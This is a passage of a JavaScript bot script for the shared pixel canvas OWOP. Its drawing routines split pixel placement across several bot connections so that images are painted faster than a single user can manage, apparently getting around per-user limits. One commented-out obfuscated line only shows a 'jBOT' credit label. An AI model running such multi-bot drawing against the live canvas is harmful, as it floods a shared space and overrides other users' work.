    this.job = "fast filling";
    color = color || OWOP.player.palette[OWOP.player.paletteIndex];
    //err(bots.job + " [" + x + "," + y + "] " + w + "x" + h + " #" + (((color[0] << 16) | color[1] << 8) | color[2]).toString(16));
    this.busy = true;
    var pixel, newY, newX, Y, X, i;
    //this.moveTonoi(9999999, 9999999);
    await sleep(100);
    var b = -1;
    for (X = 0; X < w; X++) {
        for (Y = 0; Y < h; Y++) {
                if (this.stop) return this.stop = this.busy = false;
                over = 0;
                newX = X;
                newY = Y;
                pixel = OWOP.world.getPixel(x + newX, y + newY);
                if (pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2]) {
                    this[b=++b%BOTS].pixel(x + newX, y + newY, color);//.net.updatePixel(x + newX, y + newY, color);
                    //await sleep(DELAY);
                } else continue;
          //this.moveTo(x + Math.floor(X / 40) * 40, y + Y); //bot se musi presunout,aby byl v dosahu
        }
    }
    this.busy = false;
    this.moveTonoi(9999999, 9999999);
    //err(bots.job + " done.");
};

bots.drawRectbrush = async function(x, y, w, h, color) {//-54 25 57 39
    if (isNaN(x) || isNaN(y) || isNaN(w) || isNaN(h)) {
        return;
    }
    if (!this.online) {
        return;
    }
    color = color || OWOP.player.palette[OWOP.player.paletteIndex];
    //this.busy = true;
    var pixel, newY, newX, Y, X, i;
    //this.moveTonoi(9999999, 9999999);
    //await sleep(100);
    var b = -1;
    for (Y = 0; Y < h; Y++) {
        for (X = 0; X < w; X += BOTS) {
            for (i = 0; i < BOTS; i++) {
                if (this.stop)
                    return this.stop = this.busy = false;
                if (X + i < w) {
                    over = 0;
                    newX = X + i;
                    newY = Y;
                    pixel = OWOP.world.getPixel(x + newX, y + newY);
                    if (pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2]) {
                        this[b=++b%BOTS].pixel(x + newX, y + newY, color);//.net.updatePixel(x + newX, y + newY, color);
                        //await sleep(DELAY);
                    } else continue;
                }
            }
          //this.moveTo(x + Math.floor(X / 40) * 40, y + Y); //bot se musi presunout,aby byl v dosahu
        }
    }
    this.moveTonoi(9999999, 9999999);
    this.busy = false;
};

bots.drawBmp = async function(x, y, w, h, data) { //data=[[r,g,b],[r,g,b]]
    this.busy = true;
    this.moveTo(x, y);
    var newData = [];
    for (var i = 0; i < data.length; i++) {
        newData[i * 3    ] = data[i][0];
        newData[i * 3 + 1] = data[i][1];
        newData[i * 3 + 2] = data[i][2];
    }
    this.drawRaw(x, y, w, h, newData, "rgb");
};

bots.testdraw = async function(x, y, w, h, data, colors) { //data=[r,g,b,a,r,g,b,a]
    if (!this.online) {
        err("bot offline");
        return;
    }
    this.busy = true;
    bots.job = "drawing";
    var pixel, color;
    var k = (colors == "rgba" ? 4 : 3);
    //this.moveTonoi(9999999, 9999999);
    await sleep(100);
	var b = -1;
    for (var X = 0; X < h; X++) {
        for (var Y = 0; Y < h; Y++) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
                        await sleep(0);
				} else continue;
			}
            //this.moveTo(x + Math.floor(X / 40) * 40, y + Y);
        }
    }
    this.busy = false;
    this.moveTonoi(9999999, 9999999);
}.bind(bots);

//colors= "rgb" or "rgba"
bots.drawRaw = async function(x, y, w, h, data, colors) { //data=[r,g,b,a,r,g,b,a]
    if (!this.online) {
        err("bot offline");
        return;
    }
    this.busy = true;
    bots.job = "drawing";
    var pixel, color;
    var k = (colors == "rgba" ? 4 : 3);
    //this.moveTonoi(9999999, 9999999);
    await sleep(100);
	var b = -1;
    for (var Y = 0; Y < h; Y++) {
        for (var X = 0; X < w; X++) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                        await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
				} else continue;
			}
            //this.moveTo(x + Math.floor(X / 40) * 40, y + Y);
        }
    }
    this.busy = false;
    this.moveTonoi(9999999, 9999999);
}.bind(bots);

bots.drawRawbottom = async function(x, y, w, h, data, colors) { //data=[r,g,b,a,r,g,b,a]
    if (!this.online) {
        err("bot offline");
        return;
    }
    this.busy = true;
    bots.job = "drawing";
    var pixel, color;
    var k = (colors == "rgba" ? 4 : 3);
    this.moveTonoi(9999999, 9999999);
    await sleep(100);
	var b = -1;
    for (var Y = h; Y > -1; Y--) {
        for (var X = w; X > -1; X--) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                        await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
				} else continue;
			}
            //this.moveTo(x + Math.floor(X / 40) * 40, y + Y);
        }
    }
    this.busy = false;
    this.moveTonoi(9999999, 9999999);
}.bind(bots);

    function randint(min, max) {
        return Math.floor(Math.random() * (max - min)) + min;
    }

    function generateRandomIndexes(width, height) {
        let sequence = [];
        for (let i = 0; i < width * height; i++) {
            sequence[i] = i;
        }

        for (let i = sequence.length - 1; i > 0; i--) {
            let j = randint(0, i);
            let tmp = sequence[i];
            sequence[i] = sequence[j];
            sequence[j] = tmp;
        }

        return sequence
    }

bots.drawRandom = async function (x, y, w, h, data, colors) { //data=[r,g,b,a,r,g,b,a]
    if (!this.online) {
        err("bot offline");
        return;
    }
    this.busy = true;
    bots.job = "drawing";
    var pixel, color;
    var k = (colors == "rgba" ? 4 : 3);
    let indexes = generateRandomIndexes(w, h);
    //this.moveTonoi(9999999, 9999999);
    await sleep(100);
    var b = -1;
    while (indexes.length) {
        let index = indexes.pop();
        let X = index % w;
        let Y = index / h | 0;
        if (this.stop)
            return this.stop = this.busy = false;
            color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
                data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
            ]; //rgba
            pixel = OWOP.world.getPixel(x + X, y + Y);
            if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2]) &&
                color[3] /*!= 0*/ ) {
                        await sleep(0);
                this[b = ++b % BOTS].pixel(x + X, y + Y, color);
            } else continue;

    }
    this.busy = false;
    this.moveTonoi(9999999, 9999999);
}.bind(bots);

bots.drawRawfast = async function(x, y, w, h, data, colors) { //data=[r,g,b,a,r,g,b,a]
    if (!this.online) {
        err("bot offline");
        return;
    }
    this.busy = true;
    bots.job = "drawing";
    var pixel, color;
    var k = (colors == "rgba" ? 4 : 3);
    //this.moveTonoi(9999999, 9999999);
    await sleep(100);
	var b = -1;
    for (var Y = 0; Y < h; Y++) {
        for (var X = 0; X < w; X++) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
					await this[b=++b%BOTS].pixel(x + X, y + Y, color);
					//await sleep(DELAY);
				} else continue;
			}
            //this.moveTo(x + Math.floor(X / 40) * 40, y + Y);
        }
    }
    this.busy = false;
    this.moveTonoi(9999999, 9999999);
}.bind(bots);

//var _0xc1f2=["\x73\x70\x61\x6E","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74","\x6A\x42\x4F\x54\x20\x62\x79\x20\x41\x75\x74\x6F\x70\x6C\x61\x79\x65\x72\x20\x38\x2E\x30\x2E\x30","\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65","\x66\x72\x61\x6D\x65\x64\x20\x77\x68\x69\x74\x65\x74\x65\x78\x74","\x70\x6F\x73\x69\x74\x69\x6F\x6E","\x73\x74\x79\x6C\x65","\x61\x62\x73\x6F\x6C\x75\x74\x65","\x74\x6F\x70","\x2D\x34\x70\x78","\x72\x69\x67\x68\x74","\x31\x34\x38\x70\x78","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x59\x6F\x75\x20\x63\x61\x6E\x27\x74\x20\x63\x68\x61\x6E\x67\x65\x20\x74\x68\x69\x73\x20\x74\x65\x78\x74","\x32\x30\x70\x78"];var jbot=document[_0xc1f2[1]](_0xc1f2[0]);jbot[_0xc1f2[2]]= _0xc1f2[3];jbot[_0xc1f2[4]]= _0xc1f2[5];jbot[_0xc1f2[7]][_0xc1f2[6]]= _0xc1f2[8];jbot[_0xc1f2[7]][_0xc1f2[9]]= _0xc1f2[10];jbot[_0xc1f2[7]][_0xc1f2[11]]= _0xc1f2[12];document[_0xc1f2[14]][_0xc1f2[13]](jbot);var jbot=document[_0xc1f2[1]](_0xc1f2[0]);jbot[_0xc1f2[2]]= _0xc1f2[15];jbot[_0xc1f2[4]]= _0xc1f2[5];jbot[_0xc1f2[7]][_0xc1f2[6]]= _0xc1f2[8];jbot[_0xc1f2[7]][_0xc1f2[9]]= _0xc1f2[16];jbot[_0xc1f2[7]][_0xc1f2[11]]= _0xc1f2[12];document[_0xc1f2[14]][_0xc1f2[13]](jbot)

bots.drawPoint = async function(x, y, w, h, data, colors) { //data=[r,g,b,a,r,g,b,a]
    if (!this.online) {
        err("bot offline");
        return;
    }
    this.busy = true;
    var pixel, color;
    var k = (colors == "rgba" ? 4 : 3);
	await sleep();
	var b = -1;
	for (var Y = 0; Y < h; Y+=32) {
        for (var X = 0; X < w; X+=32) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                        await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
				} else continue;
			}
        }
    }
				for (var Y = 0; Y < h; Y+=16) {
        for (var X = 0; X < w; X+=16) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                        await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
		for (var Y = 0; Y < h; Y+=8) {
        for (var X = 0; X < w; X+=8) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                        await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
				for (var Y = 0; Y < h; Y+=4) {
        for (var X = 0; X < w; X+=4) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                        await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
				for (var Y = 0; Y < h; Y+=2) {
        for (var X = 0; X < w; X+=2) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                        await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=1) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                        await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=1) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
//					await sleep();
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
					//OWOP.chat.local("Verificando Erros...");
									} else continue;
			}
        }
    }
    this.busy = false;
    this.moveTonoi(9999999, 9999999);
    //OWOP.chat.local("Terminei de desenhar no modo 32Points. ✔");
}.bind(bots);

bots.drawListras = async function(x, y, w, h, data, colors) { //data=[r,g,b,a,r,g,b,a]
    if (!this.online) {
        err("bot offline");
        return;
    }
    this.busy = true;
    var pixel, color;
    var k = (colors == "rgba" ? 4 : 3);
	await sleep();
	var b = -1;
	for (var Y = 0; Y < h; Y +=1) {
        for (var X = 0; X < w; X +=32) {

			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
				} else continue;
			}
        }
    }
	for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=16) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
	for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=8) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
	for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=4) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
	for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=2) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=10) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=14) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=18) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=22) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=26) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=30) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=1) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=1) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
					//OWOP.chat.local("Verificando Erros...");
									} else continue;
			}
        }
    }
    this.busy = false;
    this.moveTonoi(9999999, 9999999);
    //OWOP.chat.local("Terminei de desenhar no modo 32Listras. ✔");
}.bind(bots);

bots.drawSquares = async function(x, y, w, h, data, colors) { //data=[r,g,b,a,r,g,b,a]
    if (!this.online) {
        err("bot offline");
        return;
    }
    this.busy = true;
    var pixel, color;
    var k = (colors == "rgba" ? 4 : 3);
	await sleep();
	var b = -1;
	for (var Y = 0; Y < h; Y+=16) {
        for (var X = 0; X < w; X+=1) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
				} else continue;
			}
        }
    }
				for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=16) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
					for (var Y = 0; Y < h; Y+=8) {
        for (var X = 0; X < w; X+=1) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
				for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=8) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
				for (var Y = 0; Y < h; Y+=4) {
        for (var X = 0; X < w; X+=1) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
				for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=4) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
				for (var Y = 0; Y < h; Y+=2) {
        for (var X = 0; X < w; X+=1) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
				for (var Y = 0; Y < h; Y+=1) {
        for (var X = 0; X < w; X+=2) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
    for (var Y = 0; Y < h; Y++) {
        for (var X = 0; X < w; X++) {
			if (this.stop)
				return this.stop = this.busy = false;
			if (X < w) {
				color = [data[(X + Y * w) * k], data[(X + Y * w) * k + 1],
					data[(X + Y * w) * k + 2], k == 4 ? data[(X + Y * w) * k + 3] : 255
				]; //rgba
				pixel = OWOP.world.getPixel(x + X, y + Y);
				if ((pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2])
				  && color[3] /*!= 0*/) { //pokud je barva jina
                    await sleep(0);
					this[b=++b%BOTS].pixel(x + X, y + Y, color);
									} else continue;
			}
        }
    }
    this.busy = false;
    this.moveTonoi(9999999, 9999999);
    //OWOP.chat.local("Terminei de desenhar no modo Square. ✔");
}.bind(bots);

bots.getPixel = function(x, y) {
    // NOTICE: Number.mod is modified! Check the top of the file ^
	var px, i = [x >> 4, y >> 4].join();
    if (i in this.chunks)
